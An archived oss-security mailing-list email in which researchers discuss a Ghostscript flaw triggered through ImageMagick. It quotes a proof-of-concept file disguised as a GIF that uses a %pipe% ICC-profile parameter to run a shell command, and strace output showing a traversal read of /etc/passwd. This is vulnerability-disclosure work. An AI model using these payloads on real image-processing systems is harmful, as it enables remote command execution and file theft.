X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["942" "Friday" "30" "September" "2016" "15:58:25" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkJnFQuTGgRzkPhAV1x+eBnh3r7sXSs=9OMNNVMDUDorRg@mail.gmail.com>" "29" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016093022:58:25" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 30   29/942   " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<8737kh14b8.fsf@mid.deneb.enyo.de>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "<877f9vcjd9.fsf@mid.deneb.enyo.de>" "<CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>" "<CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>" "<CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>" "<8737kh14b8.fsf@mid.deneb.enyo.de>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19895 invoked by uid 550); 30 Sep 2016 22:58:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19874 invoked from network); 30 Sep 2016 22:58:58 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
         :cc;
        bh=+p6H+U55JOFccojYpeQ1tvxknpMoc0yehUhkEh+GzM4=;
        b=iTUWo6rM4kSLVnkxUHyEc4astFOHkmHlJLh5ARegUS0ngAXfVRAwloTCq5c2m06MBH
         As8EG+n0V4ma/t3PBKN8WAcKXweK6G3Gnkcb//maSFXJngMdIIW2f0VI3QjBOdw+s4Vm
         XvaHN4/7ukJNRLiTUqOS4kpUiQegSgVGaMAOu47JkbitzLQ8hwRMwirwVPkBMj4n8BVN
         gvn1phGWF7QsyLBE7G8GvxfhVAgWI9rvHtXCtr0JJIKBUg8agp3yr01Dr8MWhT4ITtoM
         ppW5mMsFsqALqhuCmMf65+cYs/QeQUkj9yQF8ANEI8VsEgM1STGjtKNl1dDkriOa7FTX
         sanQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to:cc;
        bh=+p6H+U55JOFccojYpeQ1tvxknpMoc0yehUhkEh+GzM4=;
        b=TSn7mmQAG3OO9gvYEZySBJpHMGBeh42VZYvjkrPMGxdCmqNYja+SlGn60Jpe4gw5up
         RN2IGxZSsIV8NTUFrAnwn2uMlzuA4j8OgUwv3Wv1M7Q8cTEbO0L1jvqbc+Et31aNp8+r
         xeCOB8MpXi3TzvX0977E7aAHSUEPwQcLx82s8R4KMzx8VjegSbRiPej3z/yB8FXz1c6V
         ML6XxSEpWIUnd1RxZmQ5Ly0ay/m7EqCXwpqgCI1+uB1Fh5rdDaeVmKcyCYcuhtf1ggdW
         LWsFxrBTi92NHmHJGOEeJh7ZhK2nUTnNWuYdBplKlvxAmRqx8P8B/vF2eM7Uuchu2S/q
         A+Tg==
X-Gm-Message-State: AA6/9Rmkg9ZxV2FSXlYiXK3qnu+NTh9l83t8M3uFB8xzXYLlIS7yv+UQZMgsgnDqFa/fThimz/gOQFcMVK1exwGY
X-Received: by 10.31.200.71 with SMTP id y68mr7403483vkf.126.1475276326555;
 Fri, 30 Sep 2016 15:58:46 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <8737kh14b8.fsf@mid.deneb.enyo.de>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
 <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
 <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
 <877f9vcjd9.fsf@mid.deneb.enyo.de> <CAJ_zFk+T7TD7Ke=k7kbRbxGfnyARQXX1YxGehshKj11RxQD6BA@mail.gmail.com>
 <CAJ_zFkLoaj_k74mMCFwWs+n7Mv9gwOdFa3AcyQf=W_ViHS2nag@mail.gmail.com>
 <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com> <8737kh14b8.fsf@mid.deneb.enyo.de>
Message-ID: <CAJ_zFkJnFQuTGgRzkPhAV1x+eBnh3r7sXSs=9OMNNVMDUDorRg@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Cc: oss-security@lists.openwall.com
Date: Fri, 30 Sep 2016 15:58:25 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: Florian Weimer <fw@deneb.enyo.de>

On Fri, Sep 30, 2016 at 2:11 PM, Florian Weimer <fw@deneb.enyo.de> wrote:
> * Tavis Ormandy:
>>
>> $ cat test.gif
>> currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
>> .putdeviceparams
>> quit
>> $ convert test.gif png:test.png
>>
>> (Note: I don't know why it doesn't work on earlier versions, maybe
>> it's possible to make it work, or some other param will work)
>
> It still tries to open a file in earlier versions, with directory
> traversal:
>
> [pid 29607] open("/usr/share/ghostscript/9.06/iccprofiles/../../../../../etc/passwd", O_RDONLY) = 5
>
> The %pipe%-based execution was introduced as a side effect of:
>

Thanks Florian! I took a look where that directory comes from, I think
it pulls it from a userparam, like:

<< (ICCProfilesDir) (whatever) >> .setuserparams

That probably needs to be fixed. I wonder if there's a way to get that
directory to populate back into the PermitFileReading array?

Tavis.
